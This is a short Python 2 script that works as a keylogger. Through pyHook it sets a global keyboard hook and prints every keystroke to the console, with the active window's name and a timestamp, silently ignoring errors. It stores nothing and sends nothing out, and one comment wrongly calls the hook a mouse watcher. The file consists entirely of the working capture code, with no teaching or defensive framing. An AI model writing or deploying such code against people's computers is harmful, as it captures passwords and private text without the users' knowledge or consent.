import pythoncom, pyHook

#global window
window = None

def OnKeyboardEvent(event):
    global window
    try:
        if window != int(event.Window):
            window = int(event.Window)
            print '\n\nTime:{}\nWindowName:{}\n'.format(event.Time,event.WindowName) 
        
        if "Return" == str(event.Key) :
            print "<Enter>" 
        elif "Tab" ==  str(event.Key) :
            print "<Tab>" 
        elif str(event.Key).endswith("shift") :
            print "<Shift>",
        else :
            print event.Key.lower(), 
    except:
        pass
    # return True to pass the event to other handlers
    return True

# create a hook manager
hm = pyHook.HookManager()
# watch for all mouse events
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
